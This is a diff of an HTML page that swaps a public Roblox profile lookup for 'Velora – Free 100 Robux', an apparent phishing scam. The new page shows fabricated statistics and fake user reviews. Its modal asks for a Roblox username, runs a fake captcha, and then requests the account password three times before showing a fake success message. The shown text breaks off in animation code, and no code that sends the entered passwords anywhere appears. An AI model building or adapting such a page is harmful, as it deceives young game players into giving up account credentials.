@@ -1,489 +1,1093 @@
 <!DOCTYPE html>
-<html lang="uz">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Roblox Account Finder</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Velora – Free 100 Robux</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            color: #eee;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        .bg-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=1600&q=80') center/cover no-repeat;
+            z-index: -3;
+        }
+        .bg-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(2px);
+            z-index: -2;
+        }
+        #particleCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 150;
+        }
+        .youtube-player-container {
+            position: absolute;
+            width: 0;
+            height: 0;
+            overflow: hidden;
+            pointer-events: none;
+            opacity: 0;
+            z-index: -10;
+        }
 
-    :root {
-      --bg: #08090d;
-      --card: rgba(19, 21, 29, 0.82);
-      --border: rgba(255,255,255,.09);
-      --text: #f5f7fb;
-      --muted: #8f96a8;
-      --accent: #ffffff;
-      --danger: #ff5b6e;
-    }
+        /* NAVBAR – centered pill with rounded corners */
+        .navbar {
+            position: fixed;
+            top: 16px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: auto;
+            max-width: 90%;
+            padding: 10px 24px;
+            background: rgba(10,10,10,0.3);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 60px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 28px;
+            z-index: 100;
+            transition: 0.3s;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+            flex-wrap: wrap;
+        }
+        .navbar .logo {
+            font-size: 1.4rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #fff, #ccc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 30px rgba(255,255,255,0.1);
+            white-space: nowrap;
+        }
+        .navbar .nav-links {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .navbar .nav-links a {
+            color: rgba(255,255,255,0.8);
+            text-decoration: none;
+            font-size: 0.85rem;
+            letter-spacing: 0.5px;
+            transition: 0.2s;
+            position: relative;
+            text-shadow: 0 0 20px rgba(0,0,0,0.5);
+            white-space: nowrap;
+        }
+        .navbar .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 0;
+            height: 1.5px;
+            background: #fff;
+            transition: 0.3s;
+        }
+        .navbar .nav-links a:hover { color: #fff; }
+        .navbar .nav-links a:hover::after { width: 100%; }
+        .sound-toggle {
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 30px;
+            padding: 5px 14px;
+            color: #eee;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            backdrop-filter: blur(4px);
+            text-shadow: 0 0 10px rgba(0,0,0,0.5);
+            white-space: nowrap;
+        }
+        .sound-toggle:hover { border-color: rgba(255,255,255,0.5); background: rgba(255,255,255,0.15); }
+        .sound-toggle svg { width: 16px; height: 16px; stroke: currentColor; fill: none; stroke-width: 2; }
 
-    body {
-      min-height: 100vh;
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      background:
-        radial-gradient(circle at 15% 20%, rgba(84, 93, 255, .16), transparent 30%),
-        radial-gradient(circle at 85% 80%, rgba(0, 220, 255, .10), transparent 28%),
-        var(--bg);
-      color: var(--text);
-      display: grid;
-      place-items: center;
-      padding: 24px;
-    }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 100px 24px 40px;
+            position: relative;
+            z-index: 1;
+        }
+        section { margin-bottom: 80px; }
 
-    .app {
-      width: min(760px, 100%);
-    }
+        .hero {
+            text-align: center;
+            padding: 40px 0 20px;
+        }
+        .hero h1 {
+            font-size: 3.4rem;
+            font-weight: 300;
+            letter-spacing: -1px;
+            background: linear-gradient(135deg, #fff 30%, #aaa 80%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: fadeInUp 0.8s ease;
+            text-shadow: 0 0 40px rgba(0,0,0,0.3);
+        }
+        .hero h1 span { font-weight: 700; background: none; -webkit-text-fill-color: #fff; }
+        .hero .sub {
+            color: rgba(255,255,255,0.7);
+            font-size: 0.9rem;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-top: 6px;
+            animation: fadeInUp 1s ease;
+            text-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        .hero .stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin: 30px 0 36px;
+            flex-wrap: wrap;
+        }
+        .hero .stat-item {
+            background: rgba(0,0,0,0.35);
+            backdrop-filter: blur(8px);
+            border-radius: 20px;
+            padding: 18px 28px;
+            border: 1px solid rgba(255,255,255,0.08);
+            min-width: 100px;
+            transition: 0.3s;
+            animation: fadeInUp 1.2s ease;
+        }
+        .hero .stat-item:hover { background: rgba(255,255,255,0.1); transform: translateY(-4px); }
+        .hero .stat-item .number { font-size: 2rem; font-weight: 600; color: #fff; }
+        .hero .stat-item .label { font-size: 0.7rem; text-transform: uppercase; color: rgba(255,255,255,0.6); letter-spacing: 1px; }
+        .hero .claim-btn {
+            display: inline-block;
+            padding: 24px 64px;
+            background: #fff;
+            color: #000;
+            border: none;
+            border-radius: 60px;
+            font-size: 1.6rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.25s;
+            box-shadow: 0 8px 30px rgba(255,255,255,0.15);
+            animation: pulseGlow 3s ease-in-out infinite;
+            letter-spacing: 1px;
+            min-width: 320px;
+        }
+        .hero .claim-btn:hover { transform: scale(1.05); box-shadow: 0 12px 50px rgba(255,255,255,0.3); }
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 8px 30px rgba(255,255,255,0.15); }
+            50% { box-shadow: 0 8px 50px rgba(255,255,255,0.35); }
+        }
 
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 20px;
-    }
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 24px;
+            margin-top: 20px;
+        }
+        .feature-card {
+            background: rgba(0,0,0,0.35);
+            backdrop-filter: blur(8px);
+            border-radius: 24px;
+            padding: 28px 20px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.06);
+            transition: 0.3s;
+            opacity: 0;
+            transform: translateY(30px);
+            animation: fadeUp 0.6s ease forwards;
+        }
+        .feature-card:nth-child(2) { animation-delay: 0.15s; }
+        .feature-card:nth-child(3) { animation-delay: 0.3s; }
+        .feature-card:nth-child(4) { animation-delay: 0.45s; }
+        .feature-card:hover { background: rgba(255,255,255,0.08); transform: translateY(-6px); }
+        .feature-card svg {
+            width: 40px;
+            height: 40px;
+            stroke: #ccc;
+            fill: none;
+            stroke-width: 1.5;
+            margin-bottom: 12px;
+        }
+        .feature-card h3 { font-weight: 500; font-size: 1.1rem; margin-bottom: 6px; color: #eee; }
+        .feature-card p { color: rgba(255,255,255,0.6); font-size: 0.9rem; line-height: 1.5; }
 
-    .logo {
-      width: 46px;
-      height: 46px;
-      border-radius: 14px;
-      display: grid;
-      place-items: center;
-      background: #fff;
-      box-shadow: 0 12px 40px rgba(255,255,255,.12);
-    }
+        .reviews-section { margin-top: 20px; }
+        .reviews-section h2 {
+            text-align: center;
+            font-weight: 300;
+            letter-spacing: 2px;
+            color: rgba(255,255,255,0.7);
+            margin-bottom: 24px;
+            text-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        .review-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 16px;
+        }
+        .review-card {
+            background: rgba(0,0,0,0.3);
+            backdrop-filter: blur(8px);
+            padding: 16px 18px;
+            border-radius: 16px;
+            border-left: 3px solid rgba(255,255,255,0.2);
+            transition: 0.3s;
+            opacity: 0;
+            transform: translateX(-20px);
+            animation: slideIn 0.5s ease forwards;
+        }
+        .review-card:nth-child(1) { animation-delay: 0.05s; }
+        .review-card:nth-child(2) { animation-delay: 0.1s; }
+        .review-card:nth-child(3) { animation-delay: 0.15s; }
+        .review-card:nth-child(4) { animation-delay: 0.2s; }
+        .review-card:nth-child(5) { animation-delay: 0.25s; }
+        .review-card:nth-child(6) { animation-delay: 0.3s; }
+        .review-card:nth-child(7) { animation-delay: 0.35s; }
+        .review-card:nth-child(8) { animation-delay: 0.4s; }
+        .review-card:nth-child(9) { animation-delay: 0.45s; }
+        .review-card:nth-child(10) { animation-delay: 0.5s; }
+        .review-card:hover { background: rgba(255,255,255,0.08); transform: translateY(-3px); }
+        .review-card .name { color: rgba(255,255,255,0.8); font-weight: 500; font-size: 0.85rem; }
+        .review-card .text { color: rgba(255,255,255,0.6); font-size: 0.85rem; margin-top: 4px; line-height: 1.4; }
 
-    .logo svg {
-      width: 25px;
-      height: 25px;
-    }
+        footer {
+            text-align: center;
+            padding: 30px 0 20px;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            color: rgba(255,255,255,0.4);
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+            text-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
 
-    h1 {
-      font-size: clamp(28px, 5vw, 44px);
-      letter-spacing: -1.7px;
-      line-height: 1;
-    }
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(8px);
+            z-index: 200;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+        .modal-overlay.active { display: flex; }
+        .modal-box {
+            background: rgba(17,17,17,0.95);
+            backdrop-filter: blur(16px);
+            border-radius: 32px;
+            padding: 32px 28px;
+            max-width: 500px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.08);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.9);
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: scaleIn 0.3s ease;
+        }
+        .modal-box .step { display: block; }
+        .modal-box .hidden { display: none; }
+        .modal-box h2 {
+            font-weight: 300;
+            font-size: 2rem;
+            margin-bottom: 8px;
+            color: #eee;
+        }
+        .modal-box .desc { color: #888; margin-bottom: 20px; }
+        .modal-box .input-group { margin: 12px 0 16px; }
+        .modal-box .input-group input {
+            width: 100%;
+            padding: 14px 18px;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 30px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+        }
+        .modal-box .input-group input:focus { border-color: #666; }
+        .modal-box .btn {
+            width: 100%;
+            padding: 14px;
+            background: #fff;
+            color: #000;
+            border: none;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .modal-box .btn:hover { background: #ddd; }
+        .modal-box .btn-secondary { background: #222; color: #fff; border: 1px solid #444; }
+        .modal-box .btn-secondary:hover { background: #333; }
+        .modal-box .error-text { color: #ff6b6b; text-align: center; margin: 6px 0; }
+        .modal-box .status-text { color: #aaa; text-align: center; margin: 8px 0; }
+        .modal-box .captcha-box {
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 16px;
+            text-align: center;
+            margin: 12px 0;
+        }
+        .modal-box .captcha-box svg { display: block; margin: 0 auto 8px; background: #222; border-radius: 6px; }
+        .modal-box .captcha-box input { width: 160px; padding: 10px; text-align: center; background: #111; border: 1px solid #333; border-radius: 30px; color: #fff; }
+        .modal-box .spinner svg {
+            width: 36px; height: 36px;
+            animation: spin 0.9s linear infinite;
+            display: block; margin: 8px auto;
+            stroke: #aaa;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .check-big { text-align: center; padding: 10px 0; }
+        .check-big svg { width: 70px; height: 70px; stroke: #4caf50; fill: none; stroke-width: 3; }
+        .check-big .account-name { font-size: 1.4rem; font-weight: 500; margin: 8px 0 4px; color: #fff; }
+        .check-big .info-msg { color: #aaa; font-size: 0.9rem; }
 
-    .subtitle {
-      color: var(--muted);
-      margin-top: 7px;
-      font-size: 14px;
-    }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scaleIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-    .panel {
-      padding: 18px;
-      border: 1px solid var(--border);
-      border-radius: 24px;
-      background: var(--card);
-      backdrop-filter: blur(20px);
-      box-shadow: 0 30px 80px rgba(0,0,0,.35);
-    }
-
-    .search {
-      display: flex;
-      gap: 10px;
-    }
-
-    .input-wrap {
-      flex: 1;
-      position: relative;
-    }
-
-    .input-wrap svg {
-      position: absolute;
-      left: 16px;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 20px;
-      height: 20px;
-      opacity: .55;
-      pointer-events: none;
-    }
-
-    input {
-      width: 100%;
-      height: 56px;
-      border-radius: 16px;
-      border: 1px solid var(--border);
-      outline: none;
-      background: rgba(255,255,255,.045);
-      color: white;
-      font-size: 16px;
-      padding: 0 16px 0 47px;
-      transition: .2s ease;
-    }
-
-    input:focus {
-      border-color: rgba(255,255,255,.28);
-      background: rgba(255,255,255,.065);
-      box-shadow: 0 0 0 4px rgba(255,255,255,.04);
-    }
-
-    input::placeholder {
-      color: #666d7d;
-    }
-
-    button {
-      height: 56px;
-      padding: 0 22px;
-      border: 0;
-      border-radius: 16px;
-      background: var(--accent);
-      color: #08090d;
-      font-weight: 800;
-      font-size: 14px;
-      cursor: pointer;
-      transition: transform .18s ease, opacity .18s ease;
-    }
-
-    button:hover { transform: translateY(-1px); }
-    button:active { transform: translateY(1px) scale(.99); }
-    button:disabled { opacity: .55; cursor: not-allowed; transform: none; }
-
-    .status {
-      min-height: 22px;
-      margin: 13px 3px 0;
-      font-size: 13px;
-      color: var(--muted);
-    }
-
-    .status.error { color: var(--danger); }
-
-    .result {
-      display: none;
-      margin-top: 15px;
-      padding: 16px;
-      border: 1px solid var(--border);
-      border-radius: 20px;
-      background: rgba(255,255,255,.035);
-      animation: appear .35s ease;
-    }
-
-    .result.show { display: block; }
-
-    @keyframes appear {
-      from { opacity: 0; transform: translateY(8px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .profile {
-      display: flex;
-      align-items: center;
-      gap: 18px;
-    }
-
-    .avatar-shell {
-      width: 116px;
-      height: 116px;
-      flex: 0 0 116px;
-      border-radius: 24px;
-      overflow: hidden;
-      background: rgba(255,255,255,.06);
-      border: 1px solid var(--border);
-    }
-
-    .avatar {
-      width: 100%;
-      height: 100%;
-      display: block;
-      object-fit: cover;
-    }
-
-    .info {
-      min-width: 0;
-      flex: 1;
-    }
-
-    .display-name {
-      font-size: 25px;
-      font-weight: 850;
-      letter-spacing: -.7px;
-      overflow-wrap: anywhere;
-    }
-
-    .username {
-      color: var(--muted);
-      margin-top: 3px;
-      font-size: 15px;
-      overflow-wrap: anywhere;
-    }
-
-    .details {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 8px;
-      margin-top: 14px;
-    }
-
-    .pill {
-      padding: 8px 10px;
-      border-radius: 10px;
-      border: 1px solid var(--border);
-      background: rgba(255,255,255,.04);
-      font-size: 12px;
-      color: #c9ceda;
-    }
-
-    .open-profile {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      margin-top: 14px;
-      color: white;
-      text-decoration: none;
-      font-size: 13px;
-      font-weight: 750;
-    }
-
-    .open-profile svg {
-      width: 15px;
-      height: 15px;
-    }
-
-    .loader {
-      display: inline-block;
-      width: 14px;
-      height: 14px;
-      border: 2px solid rgba(255,255,255,.18);
-      border-top-color: white;
-      border-radius: 50%;
-      animation: spin .7s linear infinite;
-      vertical-align: -2px;
-      margin-right: 7px;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .hint {
-      text-align: center;
-      color: #5e6574;
-      font-size: 12px;
-      margin-top: 16px;
-    }
-
-    @media (max-width: 620px) {
-      .search { flex-direction: column; }
-      button { width: 100%; }
-      .profile { align-items: flex-start; }
-      .avatar-shell {
-        width: 92px;
-        height: 92px;
-        flex-basis: 92px;
-        border-radius: 20px;
-      }
-      .display-name { font-size: 21px; }
-    }
-  </style>
+        @media (max-width: 700px) {
+            .navbar { top: 10px; padding: 8px 16px; gap: 16px; border-radius: 40px; }
+            .navbar .logo { font-size: 1.1rem; }
+            .hero h1 { font-size: 2.4rem; }
+            .hero .stats { gap: 16px; }
+            .hero .stat-item { padding: 12px 16px; min-width: 70px; }
+            .hero .claim-btn { padding: 18px 32px; font-size: 1.2rem; min-width: 200px; }
+            .features { grid-template-columns: 1fr 1fr; }
+            .review-grid { grid-template-columns: 1fr 1fr; }
+        }
+        @media (max-width: 480px) {
+            .navbar { gap: 12px; padding: 6px 12px; }
+            .navbar .nav-links { gap: 12px; }
+            .navbar .nav-links a { font-size: 0.75rem; }
+            .sound-toggle { font-size: 0.65rem; padding: 4px 10px; }
+            .hero .claim-btn { padding: 16px 24px; font-size: 1rem; min-width: 160px; }
+            .features { grid-template-columns: 1fr; }
+            .review-grid { grid-template-columns: 1fr; }
+        }
+    </style>
 </head>
 <body>
-  <!-- Bismillah -->
-  <main class="app">
-    <div class="brand">
-      <div class="logo" aria-hidden="true">
-        <svg viewBox="0 0 32 32" fill="none">
-          <path d="M8.5 3 29 8.5 23.5 29 3 23.5 8.5 3Z" fill="#0b0c10"/>
-          <path d="M13 11.5 20.5 13 19 20.5 11.5 19 13 11.5Z" fill="white"/>
-        </svg>
-      </div>
-      <div>
-        <h1>Roblox Finder</h1>
-        <div class="subtitle">Username orqali Roblox accountni toping.</div>
-      </div>
+    <div class="bg-image"></div>
+    <div class="bg-overlay"></div>
+    <canvas id="particleCanvas"></canvas>
+
+    <div class="youtube-player-container">
+        <div id="bg-player"></div>
+        <div id="celebration-player"></div>
     </div>
 
-    <section class="panel">
-      <div class="search">
-        <div class="input-wrap">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="m20 20-3.6-3.6"></path>
-          </svg>
-          <input
-            id="usernameInput"
-            type="text"
-            autocomplete="off"
-            spellcheck="false"
-            maxlength="20"
-            placeholder="Masalan: Builderman"
-          />
+    <!-- Centered pill navbar -->
+    <nav class="navbar">
+        <div class="logo">VELORA</div>
+        <div class="nav-links">
+            <a href="#home">Home</a>
+            <a href="#features">Features</a>
+            <a href="#reviews">Reviews</a>
+            <button class="sound-toggle" id="soundToggle">
+                <svg viewBox="0 0 24 24"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>
+                <span id="soundLabel">Sound on</span>
+            </button>
         </div>
-        <button id="searchBtn">Accountni topish</button>
-      </div>
+    </nav>
 
-      <div id="status" class="status">Roblox username kiriting.</div>
+    <div class="container" id="home">
+        <section class="hero">
+            <h1><span>Robux</span> FREE 100</h1>
+            <div class="sub">— limited time offer —</div>
+            <div class="stats">
+                <div class="stat-item"><div class="number">10.2K</div><div class="label">Total</div></div>
+                <div class="stat-item"><div class="number">1.3K</div><div class="label">Online</div></div>
+                <div class="stat-item"><div class="number">78.4K</div><div class="label">Delivered</div></div>
+            </div>
+            <button class="claim-btn" id="claimBtn">CLAIM 100 ROBUX</button>
+        </section>
 
-      <div id="result" class="result">
-        <div class="profile">
-          <div class="avatar-shell">
-            <img id="avatar" class="avatar" alt="Roblox avatar" />
-          </div>
+        <section id="features">
+            <h2 style="text-align:center; font-weight:300; letter-spacing:2px; color:rgba(255,255,255,0.7); margin-bottom:16px; text-shadow:0 0 20px rgba(0,0,0,0.5);">WHY US?</h2>
+            <div class="features">
+                <div class="feature-card">
+                    <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                    <h3>Trusted</h3>
+                    <p>99.7% success rate, 78,000+ users</p>
+                </div>
+                <div class="feature-card">
+                    <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                    <h3>Fast</h3>
+                    <p>Account found & verified in 10 seconds</p>
+                </div>
+                <div class="feature-card">
+                    <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="2.18"/><line x1="8" y1="2" x2="8" y2="22"/><line x1="16" y1="2" x2="16" y2="22"/><line x1="2" y1="8" x2="22" y2="8"/><line x1="2" y1="16" x2="22" y2="16"/></svg>
+                    <h3>Free</h3>
+                    <p>No payment required ever</p>
+                </div>
+                <div class="feature-card">
+                    <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+                    <h3>Support</h3>
+                    <p>24/7 help, any issue resolved</p>
+                </div>
+            </div>
+        </section>
 
-          <div class="info">
-            <div id="displayName" class="display-name"></div>
-            <div id="username" class="username"></div>
+        <section id="reviews" class="reviews-section">
+            <h2>— 10 REVIEWS —</h2>
+            <div class="review-grid" id="reviewGrid"></div>
+        </section>
 
-            <div class="details">
-              <div id="userId" class="pill"></div>
-              <div id="verified" class="pill" style="display:none;"></div>
+        <footer>
+            &copy; 2026 Velora — all rights reserved.
+        </footer>
+    </div>
+
+    <!-- Modal (unchanged) -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-box">
+            <div id="stepFinder" class="step">
+                <h2>Account Finder</h2>
+                <p class="desc">Enter your Roblox username</p>
+                <div class="input-group">
+                    <input type="text" id="finderInput" placeholder="username" value="xX_ProPlayer_Xx">
+                </div>
+                <button class="btn" id="finderSubmit">SEARCH</button>
+                <div id="finderStatus" class="status-text"></div>
+                <div id="finderLoader" class="hidden spinner" style="display:flex;justify-content:center;">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke-width="2" stroke-dasharray="30 30" stroke-linecap="round"/></svg>
+                </div>
             </div>
 
-            <a id="profileLink" class="open-profile" target="_blank" rel="noopener noreferrer">
-              Roblox profilini ochish
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <path d="M14 5h5v5"></path>
-                <path d="M10 14 19 5"></path>
-                <path d="M19 13v6H5V5h6"></path>
-              </svg>
-            </a>
-          </div>
+            <div id="stepCaptcha" class="step hidden">
+                <h2>Captcha</h2>
+                <p class="desc">Confirm your account</p>
+                <div class="captcha-box">
+                    <svg id="captchaSvg" viewBox="0 0 120 40" stroke="currentColor" stroke-width="1.5">
+                        <text x="12" y="28" font-family="monospace" font-size="22" fill="#ccc" stroke="none">A7F9</text>
+                        <line x1="5" y1="5" x2="30" y2="35" stroke="#444"/>
+                        <line x1="95" y1="5" x2="70" y2="30" stroke="#444"/>
+                        <circle cx="105" cy="10" r="4" stroke="#444" fill="none"/>
+                    </svg>
+                    <input type="text" id="captchaInput" placeholder="Type code" maxlength="4">
+                    <div id="captchaError" class="error-text"></div>
+                </div>
+                <button class="btn" id="captchaSubmit">VERIFY</button>
+            </div>
+
+            <div id="stepPassword" class="step hidden">
+                <h2>Password (Attempt 1)</h2>
+                <p class="desc">This attempt will be wrong</p>
+                <div class="input-group">
+                    <input type="password" id="passInput" placeholder="Password">
+                </div>
+                <div id="passError" class="error-text"></div>
+                <button class="btn" id="passSubmit">SUBMIT</button>
+            </div>
+
+            <div id="stepPasswordRetry" class="step hidden">
+                <h2>Password (Attempt 2)</h2>
+                <p class="desc">Wrong again</p>
+                <div class="input-group">
+                    <input type="password" id="passRetryInput" placeholder="Password">
+                </div>
+                <div id="passRetryError" class="error-text"></div>
+                <button class="btn" id="passRetrySubmit">SUBMIT</button>
+            </div>
+
+            <div id="stepPasswordThird" class="step hidden">
+                <h2>Password (Attempt 3)</h2>
+                <p class="desc">Must be correct</p>
+                <div class="input-group">
+                    <input type="password" id="passThirdInput" placeholder="Password">
+                </div>
+                <div id="passThirdError" class="error-text"></div>
+                <button class="btn" id="passThirdSubmit">SUBMIT</button>
+            </div>
+
+            <div id="stepClaim" class="step hidden">
+                <h2>Claim Robux</h2>
+                <p class="desc">Click to claim 100 Robux</p>
+                <button class="btn" id="finalClaimBtn">CLAIM 100 ROBUX</button>
+                <div id="claimStatus" class="status-text"></div>
+                <div id="claimLoader" class="hidden spinner" style="display:flex;justify-content:center;">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke-width="2" stroke-dasharray="30 30" stroke-linecap="round"/></svg>
+                </div>
+            </div>
+
+            <div id="stepSuccess" class="step hidden">
+                <div class="check-big">
+                    <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+                    <div class="account-name" id="successUser">User</div>
+                    <div class="info-msg">Robux will arrive in 48‑24 hours</div>
+                    <div style="margin-top:8px; color:#555; font-size:0.7rem;">ID: #R-2026-09-04</div>
+                </div>
+                <button class="btn btn-secondary" id="successOk">OK</button>
+            </div>
         </div>
-      </div>
-    </section>
+    </div>
 
-    <div class="hint">Faqat public Roblox ma'lumotlari ko'rsatiladi.</div>
-  </main>
+    <script src="https://www.youtube.com/iframe_api"></script>
 
-  <script>
-    const input = document.getElementById("usernameInput");
-    const btn = document.getElementById("searchBtn");
-    const statusEl = document.getElementById("status");
-    const resultEl = document.getElementById("result");
-    const avatarEl = document.getElementById("avatar");
-    const displayNameEl = document.getElementById("displayName");
-    const usernameEl = document.getElementById("username");
-    const userIdEl = document.getElementById("userId");
-    const verifiedEl = document.getElementById("verified");
-    const profileLinkEl = document.getElementById("profileLink");
+    <script>
+        (function(){
+            // ===== YOUTUBE VIDEO IDs – put your video IDs here =====
+            const YOUTUBE_VIDEO_IDS = {
+                bg: 'YwBeOMQEnbkD5gzy',           // e.g. 'dQw4w9WgXcQ'
+                celebration: 'HCtY9GHHavABBqrD'   // e.g. 'dQw4w9WgXcQ'
+            };
 
-    function setStatus(message, error = false) {
-      statusEl.innerHTML = message;
-      statusEl.classList.toggle("error", error);
-    }
+            // ===== REVIEWS =====
+            const reviews = [
+                { name: "Alex_Blox", text: "Worked! Got 100 Robux very fast." },
+                { name: "ProGamer_99", text: "Didn't believe at first, but it actually paid." },
+                { name: "Luna_RBLX", text: "So simple and clear. I recommend it." },
+                { name: "DarkWolf_22", text: "Mine arrived in 2 hours, amazing!" },
+                { name: "NoobMaster69", text: "My friends tried too, all got it." },
+                { name: "BloxQueen", text: "One of the most reliable sites." },
+                { name: "Xx_Sniper_xX", text: "Used multiple times, never an issue." },
+                { name: "Robloxian_2025", text: "Fast and high‑quality service." },
+                { name: "CraftyPanda", text: "If you enter correctly, it always works." },
+                { name: "Shadow_Strike", text: "Thanks! Now I can buy a new skin." }
+            ];
+            const grid = document.getElementById('reviewGrid');
+            reviews.forEach(r => {
+                const div = document.createElement('div');
+                div.className = 'review-card';
+                div.innerHTML = `<div class="name">${r.name}</div><div class="text">${r.text}</div>`;
+                grid.appendChild(div);
+            });
 
-    async function findAccount() {
-      const username = input.value.trim();
+            // ===== PARTICLES =====
+            const canvas = document.getElementById('particleCanvas');
+            const ctx = canvas.getContext('2d');
+            let width, height;
+            let particles = [];
+            let particleAnimId = null;
 
-      resultEl.classList.remove("show");
+            function resizeCanvas() {
+                width = canvas.width = window.innerWidth;
+                height = canvas.height = window.innerHeight;
+            }
+            window.addEventListener('resize', resizeCanvas);
+            resizeCanvas();
 
-      if (!username) {
-        setStatus("Username kiriting.", true);
-        input.focus();
-        return;
-      }
+            class Particle {
+                constructor(x, y) {
+                    this.x = x;
+                    this.y = y;
+                    const angle = Math.random() * 2 * Math.PI;
+                    const speed = 3 + Math.random() * 7;
+                    this.vx = Math.cos(angle) * speed;
+                    this.vy = Math.sin(angle) * speed - 1;
+                    this.size = 4 + Math.random() * 10;
+                    this.life = 1;
+                    this.decay = 0.008 + Math.random() * 0.015;
+                    this.color = `hsl(${40 + Math.random() * 30}, 90%, ${60 + Math.random() * 30}%)`;
+                }
+                update() {
+                    this.x += this.vx;
+                    this.y += this.vy;
+                    this.vy += 0.06;
+                    this.life -= this.decay;
+                    this.size *= 0.99;
+                }
+                draw() {
+                    ctx.globalAlpha = this.life;
